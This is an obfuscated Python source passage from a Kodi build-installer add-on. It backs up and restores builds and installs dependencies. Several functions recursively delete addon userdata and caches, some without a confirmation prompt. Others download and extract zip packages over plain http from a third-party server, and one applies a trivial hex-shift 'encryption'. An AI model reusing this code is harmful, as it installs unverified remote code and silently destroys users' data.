 iIIIi1IiI11I1 = [ ]
 if 85 - 85: OO000
 if 61 - 61: I1IiiI * Oo0Ooo % I1ii11iIi11i * II111iiii / II111iiii + i1IIi
 if Ii1I1I == 'None' :
  OO0o . ok ( 'No Profile Set' , "There's no profile name set to the build you're currently running. Please enter a name for this build so we can save it and make sure no data is lost." )
  OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
  if ( not OO000OOo ) :
   return False , 0
  OO000OOo = OO000OOo . replace ( ' ' , '_' )
  O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
  os . makedirs ( os . path . join ( o0 , O0Oo0O00o0oo0OO ) )
  IiII1i11III = O0Oo0O00o0oo0OO
  iiIi1I1i1 = open ( O0Oo000ooO00 , 'w' )
  iiiI1i11Ii = IiiI . replace ( 'id="None"' , 'id="Local"' ) . replace ( 'name="None"' , 'name="' + str ( IiII1i11III ) + '"' )
  iiIi1I1i1 . write ( iiiI1i11Ii )
  iiIi1I1i1 . close ( )
  if 8 - 8: i1Ii11i1i % ooOo
  if 50 - 50: OoOoOO00 - ooOo + iIii1I11I1II1 - OoO0O00 . Oo0Ooo
  for iiiiIii11i1 in os . listdir ( IIiiiiiiIi1I1 ) :
   iIIIi1IiI11I1 . append ( iiiiIii11i1 )
   if 7 - 7: O0 * oOO00 - o0oOOo0O0Ooo * O0 + iIii1I11I1II1 % OoOoOO00
  oOiiI11I1ii11 = open ( os . path . join ( o0 , O0Oo0O00o0oo0OO , 'addonlist' ) , mode = 'w+' )
  for iiiiIii11i1 in os . listdir ( ooooooO0oo ) :
   if not iiiiIii11i1 in iIIIi1IiI11I1 and iiiiIii11i1 != 'plugin.program.totalinstaller' and iiiiIii11i1 != 'script.module.addon.common' and iiiiIii11i1 != 'packages' :
    oOiiI11I1ii11 . write ( iiiiIii11i1 + '|' )
  oOiiI11I1ii11 . close ( )
  if 71 - 71: o0oOOoo . I1ii11iIi11i * O0 - i1Ii11i1i - II111iiii
  o0O00OoOOo = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' ]
  I1i11II11i1iI = "Creating backup of existing build"
  iI1 = "Archiving..."
  I1I1i1i = ""
  OOo0O = "Please Wait"
  IIiIiII ( O0o0Oo , os . path . join ( o0 , O0Oo0O00o0oo0OO , 'build.zip' ) , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
  if 5 - 5: o0oOOo0O0Ooo
  if 66 - 66: OOOOOOoo0O / i11iIiiIii * O0
  if 78 - 78: oOO00 - OooO00OOoO00 % O0 - Oo % OoO0O00
 else :
  IiII1i11III = Ii1I1I . replace ( ' ' , '_' ) . replace ( ':' , '-' ) . replace ( "'" , '' )
  if 43 - 43: OoO0O00
  oOiiI11I1ii11 = open ( os . path . join ( o0 , IiII1i11III , 'addonlist' ) , mode = 'w+' )
  for iiiiIii11i1 in os . listdir ( ooooooO0oo ) :
   if not iiiiIii11i1 in iIIIi1IiI11I1 and iiiiIii11i1 != 'plugin.program.totalinstaller' and iiiiIii11i1 != 'script.module.addon.common' and iiiiIii11i1 != 'packages' :
    oOiiI11I1ii11 . write ( iiiiIii11i1 + '|' )
  oOiiI11I1ii11 . close ( )
  if 90 - 90: OoooooooOO + O0 + I1ii11iIi11i / OooO00OOoO00 / OO000 * I1ii11iIi11i
  o0O00OoOOo = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' ]
  I1i11II11i1iI = "Creating backup of existing build"
  iI1 = "Archiving..."
  I1I1i1i = ""
  OOo0O = "Please Wait"
  IIiIiII ( O0o0Oo , os . path . join ( o0 , IiII1i11III , 'build.zip' ) , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
 return IiII1i11III
 if 100 - 100: OooO00OOoO00
 if 82 - 82: iIii1I11I1II1
def iIiiII ( ) :
 iII1iii = str ( oOooOOOoOo [ : 2 ] )
 if iII1iii < 14 :
  IIi1IiII = os . path . join ( oooooOoo0ooo , 'xbmc.log' )
  if 13 - 13: II111iiii
 else :
  IIi1IiII = os . path . join ( oooooOoo0ooo , 'kodi.log' )
  if 55 - 55: Oo0Ooo % i1IIi * OooO00OOoO00
 i1ii1iIIi11i111I = open ( IIi1IiII , 'r' )
 iiiIii = i1ii1iIIi11i111I . read ( )
 i1ii1iIIi11i111I . close ( )
 if 95 - 95: Oo / II111iiii - o0oOOo0O0Ooo % i1Ii11i1i . OooO00OOoO00
 oo0oo0o00O = re . compile ( 'Host CPU: (.+?) available' ) . findall ( iiiIii )
 iiiI1ii = oo0oo0o00O [ 0 ] if ( len ( oo0oo0o00O ) > 0 ) else ''
 return iiiI1ii . replace ( ' ' , '%20' )
 if 61 - 61: Oo0Ooo * i1IIi . OoooooooOO
def iIIiI ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 O0O0O0OO00oo = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 39 - 39: oOO00 % OoOoOO00 * I1ii11iIi11i - OoooooooOO - Oo0Ooo
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( O0O0O0OO00oo ) :
  oOOO = 0
  oOOO += len ( III1I11i1iIi )
  if 62 - 62: OO000 - ooOo % iIii1I11I1II1
  if oOOO >= 0 :
   if 57 - 57: OoooooooOO / OoOoOO00
   for oooO in III1I11i1iIi :
    os . unlink ( os . path . join ( Oo0 , oooO ) )
    if 44 - 44: OoOoOO00 * i1IIi * O0
   for ooOOoOo in o0IiiiI111I :
    shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
    if 94 - 94: I1IiiI - O0
    if 18 - 18: oOO00 / ooOo . ooOo . iIii1I11I1II1 . i11iIiiIii
def Oo0o0oo0 ( ) :
 for oOOoOOooO0 in glob . glob ( os . path . join ( oooooOoo0ooo , 'xbmc_crashlog*.*' ) ) :
  Iii1IIII1Iii = oOOoOOooO0
  os . remove ( oOOoOOooO0 )
  OO0o = xbmcgui . Dialog ( )
  OO0o . ok ( "Crash Logs Deleted" , "Your old crash logs have now been deleted." )
  if 94 - 94: ooOo . o0oOOo0O0Ooo % o0oOOo0O0Ooo % I1IiiI - OOOOOOoo0O / i11iIiiIii
  if 73 - 73: O0 * i1Ii11i1i . i1IIi
def OO00OoOO ( ) :
 print '############################################################       DELETING PACKAGES             ###############################################################'
 iiii1II1ii11 = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 if 37 - 37: i1Ii11i1i - ooOo - OoO0O00
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( iiii1II1ii11 ) :
  oOOO = 0
  oOOO += len ( III1I11i1iIi )
  if 42 - 42: iIii1I11I1II1 % OO000 - I1ii11iIi11i + iIii1I11I1II1
  if oOOO > 0 :
   if 27 - 27: O0 / OoO0O00
   for oooO in III1I11i1iIi :
    os . unlink ( os . path . join ( Oo0 , oooO ) )
    if 99 - 99: OO000 - oOO00 * iIii1I11I1II1 . II111iiii
   for ooOOoOo in o0IiiiI111I :
    shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
    if 56 - 56: iIii1I11I1II1 % OoO0O00 . o0oOOoo % oOO00 . i1Ii11i1i * Oo0Ooo
    if 41 - 41: iIii1I11I1II1 % oOO00 * ooOo - o0oOOoo
def IIII1i ( path ) :
 iIiI1 = OO0o . yesno ( 'Are you certain?' , 'This will completely wipe this folder, are you absolutely certain you want to continue? There is NO going back after this!' )
 if iIiI1 == 1 :
  Ooo . create ( "Wiping Data" , "Wiping..." , '' , 'Please Wait' )
  shutil . rmtree ( path , ignore_errors = True )
  Ooo . close ( )
  xbmc . executebuiltin ( 'container.Refresh' )
  if 48 - 48: OoooooooOO
  if 77 - 77: O0 * I1ii11iIi11i * ooOo + OoO0O00 + I1ii11iIi11i - i1Ii11i1i
def iI1I1I ( url ) :
 for oOo00O0oo00o0 in os . listdir ( o0 ) :
  if oOo00O0oo00o0 != 'Master' and oOo00O0oo00o0 != url . replace ( ' ' , '_' ) . replace ( "'" , '' ) . replace ( ':' , '-' ) :
   IiII111i1i11 ( '' , '[COLOR=darkcyan]DELETE[/COLOR] ' + oOo00O0oo00o0 . replace ( '_' , ' ' ) , os . path . join ( o0 , oOo00O0oo00o0 ) , 'delete_path' , '' , '' , '' , '' )
   if 33 - 33: iIii1I11I1II1 / OOOOOOoo0O
   if 74 - 74: o0oOOo0O0Ooo / ooOo - II111iiii . II111iiii . oOO00 + II111iiii
def O0Ooo00o00O ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 O0O0O0OO00oo = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 80 - 80: OOOOOOoo0O
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( O0O0O0OO00oo ) :
  oOOO = 0
  oOOO += len ( III1I11i1iIi )
  if 3 - 3: I1ii11iIi11i * OooO00OOoO00
  if oOOO >= 0 :
   if 53 - 53: iIii1I11I1II1 / OOOOOOoo0O % OoO0O00 + oOO00 / o0oOOoo
   for oooO in III1I11i1iIi :
    os . unlink ( os . path . join ( Oo0 , oooO ) )
    if 74 - 74: Oo0Ooo
   for ooOOoOo in o0IiiiI111I :
    shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
    if 8 - 8: I1IiiI % II111iiii - o0oOOo0O0Ooo - OooO00OOoO00 % I1IiiI
    if 93 - 93: OO000 * OOOOOOoo0O / Oo
def i1I1iI1iIi111i ( ) :
 Ooo . create ( 'Checking dependencies' , '' , 'Please Wait...' )
 iiIi1IIi1I = [ ]
 if 88 - 88: ooOo
 for oOo00O0oo00o0 in os . listdir ( ooooooO0oo ) :
  if oOo00O0oo00o0 != 'packages' :
   try :
    ii = os . path . join ( ooooooO0oo , oOo00O0oo00o0 , 'addon.xml' )
    OOooooO0Oo = open ( ii , mode = 'r' )
    OO = OOooooO0Oo . read ( )
    OOooooO0Oo . close ( )
    iIiIIi1 = re . compile ( 'import addon="(.+?)"' ) . findall ( OO )
    if 1 - 1: Oo0Ooo
    for iI1I11iiI1i in iIiIIi1 :
     if 95 - 95: OoooooooOO / OooO00OOoO00 % OoooooooOO / o0oOOoo * oOO00
     if not 'xbmc.python' in iI1I11iiI1i and not iI1I11iiI1i in iiIi1IIi1I :
      iiIi1IIi1I . append ( iI1I11iiI1i )
      print 'Script Requires --- ' + iI1I11iiI1i
   except :
    pass
    if 75 - 75: O0
 return iiIi1IIi1I
 if 56 - 56: OoO0O00 / II111iiii
 if 39 - 39: OoOoOO00 - OoooooooOO - i1IIi / II111iiii
def OOoOOO000O0 ( name , addon_id ) :
 O0OOOO = 1
 ii1i1I1 = 1
 ii = xbmc . translatePath ( os . path . join ( ooooooO0oo , addon_id , 'addon.xml' ) )
 OOooooO0Oo = open ( ii , mode = 'r' )
 OO = OOooooO0Oo . read ( )
 OOooooO0Oo . close ( )
 iIiIIi1 = re . compile ( 'import addon="(.+?)"' ) . findall ( OO )
 if 49 - 49: Oo0Ooo + O0 + oOO00 . II111iiii % o0oOOoo
 for iI1I11iiI1i in iIiIIi1 :
  if 33 - 33: OoOoOO00 . iIii1I11I1II1 / OooO00OOoO00 % OO000
  if not 'xbmc.python' in iI1I11iiI1i :
   print 'Script Requires --- ' + iI1I11iiI1i
   IIiiI11 = xbmc . translatePath ( os . path . join ( ooooooO0oo , iI1I11iiI1i ) )
   if 7 - 7: I1IiiI / OoO0O00 + i1Ii11i1i + OooO00OOoO00 / I1IiiI
   if not os . path . exists ( IIiiI11 ) :
    iI1i111I1Ii = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( iI1I11iiI1i )
    i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
    I1iI = re . compile ( 'version="(.+?)"' ) . findall ( i11i1ii1I )
    OO0 = re . compile ( 'repo_url="(.+?)"' ) . findall ( i11i1ii1I )
    o0Oooo = re . compile ( 'data_url="(.+?)"' ) . findall ( i11i1ii1I )
    iiI = re . compile ( 'zip_url="(.+?)"' ) . findall ( i11i1ii1I )
    Iiii1iI1i = re . compile ( 'repo_id="(.+?)"' ) . findall ( i11i1ii1I )
    oOooO0oo00o000O = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
    iII1iii = I1iI [ 0 ] if ( len ( I1iI ) > 0 ) else ''
    OooO0o = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
    Oo00o = o0Oooo [ 0 ] if ( len ( o0Oooo ) > 0 ) else ''
    IIIi1ii = iiI [ 0 ] if ( len ( iiI ) > 0 ) else ''
    Ii1iii11I = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
    Ii11iIiiI = xbmc . translatePath ( os . path . join ( IiIIIi1iIi , oOooO0oo00o000O + '.zip' ) )
    if 3 - 3: II111iiii / Oo
    try :
     downloader . download ( OooO0o , Ii11iIiiI , Ooo )
     extract . all ( Ii11iIiiI , ooooooO0oo , Ooo )
     if 48 - 48: o0oOOoo . I1ii11iIi11i
    except :
     if 49 - 49: i1IIi - OoOoOO00 . Oo0Ooo + iIii1I11I1II1 - o0oOOoo / Oo0Ooo
     try :
      downloader . download ( IIIi1ii , Ii11iIiiI , Ooo )
      extract . all ( Ii11iIiiI , ooooooO0oo , Ooo )
      if 24 - 24: ooOo - OOOOOOoo0O / o0oOOoo
     except :
      if 10 - 10: OoOoOO00 * i1IIi
      try :
       if 15 - 15: OooO00OOoO00 + i1IIi - II111iiii % I1IiiI
       if not os . path . exists ( IIiiI11 ) :
        os . makedirs ( IIiiI11 )
        if 34 - 34: I1IiiI
       i11i1ii1I = o0OO0o0o00o ( Oo00o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
       i1iIiIi1I = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
       if 57 - 57: Oo . OO000 % o0oOOo0O0Ooo
       for oOooO0 in i1iIiIi1I :
        O0O0ooOOO = xbmc . translatePath ( os . path . join ( IIiiI11 , oOooO0 ) )
        if 32 - 32: OooO00OOoO00 / oOO00 - O0 * iIii1I11I1II1
        if addon_id not in oOooO0 and '/' not in oOooO0 :
         if 70 - 70: OoooooooOO % OoooooooOO % OoO0O00
         try :
          Ooo . update ( 0 , "Downloading [COLOR=darkcyan]" + oOooO0 + '[/COLOR]' , '' , 'Please wait...' )
          downloader . download ( Oo00o + oOooO0 , O0O0ooOOO , Ooo )
          if 98 - 98: OoO0O00
         except :
          print "failed to install" + oOooO0
          if 18 - 18: OooO00OOoO00 + Oo0Ooo - OoO0O00 / i1Ii11i1i / Oo
        if '/' in oOooO0 and '..' not in oOooO0 and 'http' not in oOooO0 :
         iiOOOO0o = Oo00o + oOooO0
         i1I1iIi1IiI ( O0O0ooOOO , iiOOOO0o )
         if 53 - 53: Oo + o0oOOo0O0Ooo . ooOo / OooO00OOoO00
      except :
       OO0o . ok ( "Error downloading dependency" , 'There was an error downloading [COLOR=dodgerblue]' + oOooO0oo00o000O + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR]' )
       ii1i1I1 = 0
       O0OOOO = 0
       if 52 - 52: i1Ii11i1i + i1Ii11i1i
    if ii1i1I1 == 1 :
     time . sleep ( 1 )
     Ooo . update ( 0 , "[COLOR=darkcyan]" + oOooO0oo00o000O + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Please wait...' )
     time . sleep ( 1 )
     i1iiiIii11 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( iI1I11iiI1i )
     try :
      o0OO0o0o00o ( i1iiiIii11 )
     except :
      pass
 Ooo . close ( )
 time . sleep ( 1 )
 if 73 - 73: o0oOOo0O0Ooo . i11iIiiIii % OoooooooOO + o0oOOoo . OoooooooOO / Oo
 if 54 - 54: OoOoOO00 . OoooooooOO
def II1i ( name , url , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 TXT . TXT ( buildname + '     v.' + version , '[COLOR=darkcyan][B]Author:   [/B][/COLOR]' + author + '[COLOR=darkcyan][B]               Last Updated:   [/B][/COLOR]' + updated + '[COLOR=darkcyan][B]               Adult Content:   [/B][/COLOR]' + adult + '[CR][CR][COLOR=darkcyan][B]Description:[CR][/B][/COLOR]' + description +
 '[CR][CR][COLOR=blue][B]Skins:   [/B][/COLOR]' + skins + '[CR][CR][COLOR=blue][B]Video Addons:   [/B][/COLOR]' + videoaddons + '[CR][CR][COLOR=blue][B]Audio Addons:   [/B][/COLOR]' + audioaddons +
 '[CR][CR][COLOR=blue][B]Program Addons:   [/B][/COLOR]' + programaddons + '[CR][CR][COLOR=blue][B]Picture Addons:   [/B][/COLOR]' + pictureaddons + '[CR][CR][COLOR=blue][B]Sources:   [/B][/COLOR]' + sources +
 '[CR][CR][COLOR=orange]Disclaimer: [/COLOR]These are community builds and they may overwrite some of your existing settings, '
 'It\'s purely the responsibility of the user to choose whether or not they wish to install these builds, the individual who uploads the build should state what\'s included and then it\'s the users decision to decide whether or not that content is suitable for them.' )
 if 83 - 83: I1IiiI - OoO0O00 - o0oOOo0O0Ooo / O0 - OooO00OOoO00 . II111iiii
 if 27 - 27: OO000
def O0Oo0Oo00o0o ( path ) :
 Ooo . create ( "Cleaning Path" , "Wiping..." , '' , 'Please Wait' )
 shutil . rmtree ( path , ignore_errors = True )
 if 17 - 17: oOO00 / o0oOOo0O0Ooo . Oo + o0oOOo0O0Ooo / I1ii11iIi11i . Oo0Ooo
def iII11 ( mode , message ) :
 if mode == 'e' :
  import random
  O00OO00OOOoO = 0
  IiI11Ii1iI = ''
  while O00OO00OOOoO < 4 :
   O00OO00OOOoO += 1
   ooOo0 = random . randrange ( 1 , 31 )
   oOo0o = hex ( ooOo0 ) [ 2 : ]
   if len ( oOo0o ) == 1 :
    oOo0o = '0' + oOo0o
   IiI11Ii1iI = IiI11Ii1iI + oOo0o
  O000OOO000o = random . randrange ( 1 , 4 )
  if O000OOO000o == 1 : IiI11Ii1iI = IiI11Ii1iI + '0A'
  if O000OOO000o == 2 : IiI11Ii1iI = IiI11Ii1iI + '04'
  if O000OOO000o == 3 : IiI11Ii1iI = IiI11Ii1iI + '06'
  if O000OOO000o == 4 : IiI11Ii1iI = IiI11Ii1iI + '08'
  I11iiIiiI1iIi11 = IiI11Ii1iI [ - 2 : ]
  II1I1I11i1I1 = int ( I11iiIiiI1iIi11 , 16 )
  iiIi1 = IiI11Ii1iI [ - II1I1I11i1I1 : - ( II1I1I11i1I1 - 2 ) ]
  oOOO0 = - int ( iiIi1 , 16 )
  if 57 - 57: O0 . OoooooooOO % I1ii11iIi11i
  if 97 - 97: i1IIi % O0 + i1IIi % ooOo * i1Ii11i1i
  Ii1iii1i = ''
  IIIIIIi1IIi1I11i = ''
  for O0o0oOooOoo in message :
   oOo0O0 = ord ( O0o0oOooOoo )
   iIi1iI = int ( oOo0O0 ) + oOOO0
   iIIII1iII1i = hex ( iIi1iI ) [ 2 : ]
   if len ( iIIII1iII1i ) == 1 :
    iIIII1iII1i = '0' + iIIII1iII1i
   IIIIIIi1IIi1I11i = str ( IIIIIIi1IIi1I11i ) + str ( iIIII1iII1i )
  return IIIIIIi1IIi1I11i + IiI11Ii1iI
 else :
  I11iiIiiI1iIi11 = message [ - 2 : ]
  II1I1I11i1I1 = int ( I11iiIiiI1iIi11 , 16 )
  iiIi1 = message [ - II1I1I11i1I1 : - ( II1I1I11i1I1 - 2 ) ]
  oOOO0 = int ( iiIi1 , 16 )
  message = message [ : - 10 ]
  O0OO00OoO00 = [ message [ O00o : O00o + 2 ] for O00o in range ( 0 , len ( message ) , 2 ) ]
  Ii11Iiii1iiii = [ int ( i1IIII1111 , 16 ) + oOOO0 for i1IIII1111 in O0OO00OoO00 ]
  Ooo0o0000OO = [ str ( unichr ( i1IIII1111 ) ) for i1IIII1111 in Ii11Iiii1iiii ]
  IiI11Ii1iI = '' . join ( Ooo0o0000OO )
  return IiI11Ii1iI . encode ( 'utf-8' )
  if 8 - 8: I1ii11iIi11i % ooOo / OO000
def IIiiI ( ) :
 os . remove ( O0Oo000ooO00 )
 os . rename ( Oo0oOOo , O0Oo000ooO00 )
 xbmc . executebuiltin ( 'UnloadSkin' )
 xbmc . executebuiltin ( "ReloadSkin" )
 OO0o . ok ( "Local Restore Complete" , 'XBMC/Kodi will now close.' , '' , '' )
 xbmc . executebuiltin ( "Quit" )
 if 37 - 37: ooOo % i1Ii11i1i % ooOo
 if 14 - 14: OoO0O00 / I1IiiI
def I1iII1IIi1IiI ( url ) :
 Ooo . create ( "Changing Physical Paths To Special" , "Renaming paths..." , '' , 'Please Wait' )
 if 66 - 66: Oo0Ooo / i11iIiiIii % o0oOOoo
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( url ) :
  if 43 - 43: Oo
  for file in III1I11i1iIi :
   if 84 - 84: Oo . oOO00 . OOOOOOoo0O
   if file . endswith ( ".xml" ) or file . endswith ( ".hash" ) or file . endswith ( "properies" ) :
    Ooo . update ( 0 , "Fixing" , file , 'Please Wait' )
    OOOOO0o0OOo = open ( ( os . path . join ( Oo0 , file ) ) ) . read ( )
    iIII1I1i = O0o0Oo . replace ( ':' , '%3a' ) . replace ( '\\' , '%5c' )
    I1IIIIII1 = O0o0Oo . replace ( '\\' , '\\\\' )
    O0oO0O = OOOOO0o0OOo . replace ( O0o0Oo , 'special://home/' ) . replace ( iIII1I1i , 'special://home/' ) . replace ( I1IIIIII1 , 'special://home/' )
    oooO = open ( ( os . path . join ( Oo0 , file ) ) , mode = 'w' )
    oooO . write ( str ( O0oO0O ) )
    oooO . close ( )
    if 20 - 20: OoOoOO00 % II111iiii . OoOoOO00 . oOO00 + Oo
    if 26 - 26: OOOOOOoo0O / OoooooooOO - Oo0Ooo
def iIIi1iii1 ( ) :
 if os . path . exists ( ooOOoooooo ) :
  shutil . rmtree ( ooOOoooooo )
 o0O00OoOOo = [ ]
 iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
 I1i11II11i1iI = "Creating full backup of existing build"
 o0ooooO0 = "Creating Community Build"
 iI1 = "Archiving..."
 I1I1i1i = ""
 OOo0O = "Please Wait"
 if 64 - 64: o0oOOoo / i1IIi % OOOOOOoo0O
 IIiIiII ( O0o0Oo , myfullbackup , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
 if 84 - 84: OoOoOO00 - Oo0Ooo . o0oOOoo . oOO00 - Oo0Ooo
def o0Oo0oO00Oooo ( ) :
 Ii1II1I11i1I = 0
 OOoOo = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
 Iiiiiii11IIiI = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
 oOOO0o = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 Oo00O = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.image.music.slideshow/cache' ) , '' )
 o0Oo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 IIi1i1IIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 o0oo0Ooo0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.navi-x/cache' ) , '' )
 o0OOoO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 I1iII1II1I1ii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.audio.ramfm/cache' ) , '' )
 oo0OO0O = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 OO0OooOOoO00OO00 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
 ii11ii1iIiI1 = os . path . join ( O0o0Oo , 'temp' )
 Ooo . create ( 'Calculating Used Space' , '' , 'Please wait' , '' )
 if os . path . exists ( OOoOo ) :
  Ii1II1I11i1I = OoOo0oO0 ( OOoOo , Ii1II1I11i1I )
 if os . path . exists ( Iiiiiii11IIiI ) :
  Ii1II1I11i1I = OoOo0oO0 ( Iiiiiii11IIiI , Ii1II1I11i1I )
 if os . path . exists ( oOOO0o ) :
  Ii1II1I11i1I = OoOo0oO0 ( oOOO0o , Ii1II1I11i1I )
 if os . path . exists ( Oo00O ) :
  Ii1II1I11i1I = OoOo0oO0 ( Oo00O , Ii1II1I11i1I )
 if os . path . exists ( o0Oo ) :
  Ii1II1I11i1I = OoOo0oO0 ( o0Oo , Ii1II1I11i1I )
 if os . path . exists ( IIi1i1IIi ) :
  Ii1II1I11i1I = OoOo0oO0 ( IIi1i1IIi , Ii1II1I11i1I )
 if os . path . exists ( o0oo0Ooo0 ) :
  Ii1II1I11i1I = OoOo0oO0 ( o0oo0Ooo0 , Ii1II1I11i1I )
 if os . path . exists ( o0OOoO ) :
  Ii1II1I11i1I = OoOo0oO0 ( o0OOoO , Ii1II1I11i1I )
 if os . path . exists ( I1iII1II1I1ii ) :
  Ii1II1I11i1I = OoOo0oO0 ( I1iII1II1I1ii , Ii1II1I11i1I )
 if os . path . exists ( oo0OO0O ) :
  Ii1II1I11i1I = OoOo0oO0 ( oo0OO0O , Ii1II1I11i1I )
 if os . path . exists ( OO0OooOOoO00OO00 ) :
  Ii1II1I11i1I = OoOo0oO0 ( OO0OooOOoO00OO00 , Ii1II1I11i1I )
 if os . path . exists ( ii11ii1iIiI1 ) :
  Ii1II1I11i1I = OoOo0oO0 ( ii11ii1iIiI1 , Ii1II1I11i1I )
 Ii1II1I11i1I = OoOo0oO0 ( IIIII , Ii1II1I11i1I )
 Ii1II1I11i1I = OoOo0oO0 ( IiIIIi1iIi , Ii1II1I11i1I ) / 1000000
 iIiI1 = OO0o . yesno ( 'Results' , 'You can free up [COLOR=dodgerblue]' + str ( Ii1II1I11i1I ) + 'MB[/COLOR] of space if you run this cleanup program. Would you like to run the cleanup procedure?' )
 if iIiI1 == 1 :
  o0IiIiI111IIII1 ( )
  try :
   shutil . rmtree ( IiIIIi1iIi )
  except :
   pass
  iIiI1 = OO0o . yesno ( 'Thumbnail Cleanup' , 'We highly recommend only wiping your OLD unused thumbnails. Do you want to clear just the old ones or all thumbnails?' , yeslabel = 'ALL' , nolabel = 'OLD ONLY' )
  if iIiI1 == 1 :
   i111iIi1i1 ( )
   O0Oo0Oo00o0o ( IIIII )
   OOo00O0O ( )
  else :
   o0o0O00o ( )
  xbmc . executebuiltin ( 'reboot' )
  if 65 - 65: iIii1I11I1II1 . OOOOOOoo0O / OO000
  if 12 - 12: I1IiiI + i1Ii11i1i
def oOooooO ( url ) :
 IiII111i1i11 ( 'folder' , 'Anime' , str ( url ) + '&genre=anime' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Audiobooks' , str ( url ) + '&genre=audiobooks' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Comedy' , str ( url ) + '&genre=comedy' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Comics' , str ( url ) + '&genre=comics' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Documentary' , str ( url ) + '&genre=documentary' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Downloads' , str ( url ) + '&genre=downloads' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Food' , str ( url ) + '&genre=food' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Gaming' , str ( url ) + '&genre=gaming' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Health' , str ( url ) + '&genre=health' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'How To...' , str ( url ) + '&genre=howto' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Kids' , str ( url ) + '&genre=kids' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Live TV' , str ( url ) + '&genre=livetv' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Movies' , str ( url ) + '&genre=movies' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Music' , str ( url ) + '&genre=music' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'News' , str ( url ) + '&genre=news' , 'grab_builds' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Photos' , str ( url ) + '&genre=photos' , 'grab_builds' , '' , '' , '' , '' )
